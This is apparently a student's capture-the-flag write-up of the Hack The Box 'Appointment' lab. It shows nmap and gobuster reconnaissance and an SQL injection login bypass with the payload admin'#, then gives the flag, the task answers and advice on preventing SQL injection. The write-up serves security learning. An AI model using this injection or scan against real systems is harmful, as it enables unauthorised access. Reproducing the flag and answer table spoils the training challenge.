# Hack The Box: Appointment Writeup — Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** SQL Injection, Web, Apache, OWASP A03:2021

Another day, another box! This time we're exploiting a classic SQL Injection vulnerability to bypass a login page without knowing the password 😄 Let's dive in 🚀

---

## What is Appointment?

Appointment is a Very Easy difficulty machine from Hack The Box Starting Point Tier 1. It focuses on SQL Injection — one of the most dangerous and common web vulnerabilities. A great box for beginners getting into web application hacking.

**Skills covered:**
- Network reconnaissance with Nmap
- Directory enumeration with Gobuster
- SQL Injection login bypass

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Then spawn the Appointment machine from the HTB Starting Point page. My target IP was `10.129.102.144`.

---

## Step 1 — Ping the Target

Before doing anything, confirm the machine is reachable:

```bash
ping -c 4 10.129.102.144
```

Got 4 replies back with 0% packet loss. Target is alive. ✅

---

## Step 2 — Nmap Scan

Run a service version scan to find open ports:

```bash
nmap -sVC -T4 10.129.102.144
```

**Result:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 (Debian)
|_http-title: Login
```

Only port 80 is open, running **Apache httpd 2.4.38 (Debian)**. The page title says "Login" — so there's a web login page waiting for us.

---

## Step 3 — Understanding the Vulnerability

SQL Injection is classified as **A03:2021** in the OWASP Top 10. It happens when user input is not sanitized and gets interpreted as part of a SQL query.

In MySQL, the `#` character comments out the rest of a line. This is the key to our attack.

---

## Step 4 — Directory Enumeration with Gobuster

In web application terminology, a folder is called a **directory**. We use Gobuster with the `dir` switch to brute force hidden directories:

```bash
gobuster dir -u http://10.129.102.144 -w /usr/share/wordlists/dirb/common.txt
```

To confirm the switch:

```bash
gobuster --help | grep directory
```

---

## Step 5 — Visit the Login Page

Open the browser and go to `http://10.129.102.144`. A login page appears asking for username and password.

The backend SQL query probably looks like this:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

If we inject `admin'#` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything'
```

The `#` comments out the password check completely — so we log in as admin without needing the password!

---

## Step 6 — SQL Injection Login Bypass

Enter the following in the login form:

```
Username: admin'#
Password: anything
```

Click Login and we're in! ✅

---

## Flag

```
e3d0796d002a446c0e6222226f42e9672
```

The first word on the returned page is **Congratulations**.

---

## Task Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the acronym SQL stand for? | `Structured Query Language` |
| 2 | What is one of the most common types of SQL vulnerabilities? | `SQL Injection` |
| 3 | What is the 2021 OWASP Top 10 classification for this vulnerability? | `A03:2021` |
| 4 | What does Nmap report as the service running on port 80? | `Apache httpd 2.4.38 (Debian)` |
| 5 | What is the standard port used for HTTPS? | `443` |
| 6 | What is a folder called in web-application terminology? | `Directory` |
| 7 | What is the HTTP response code for Not Found errors? | `404` |
| 8 | What Gobuster switch is used to discover directories? | `dir` |
| 9 | What single character comments out the rest of a line in MySQL? | `#` |
| 10 | What is the first word on the webpage returned after login bypass? | `Congratulations` |

---

## What I Learned

Appointment shows how dangerous unsanitized user input can be. A single quote and a comment character was enough to completely bypass authentication. To prevent SQL Injection in real applications:

- **Use prepared statements** — never build SQL queries by concatenating user input
- **Validate all input** on the server side — never trust what comes from the client
- **Least privilege** — database accounts used by web apps should have minimum permissions

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) — IT Undergraduate | Cybersecurity Enthusiast*
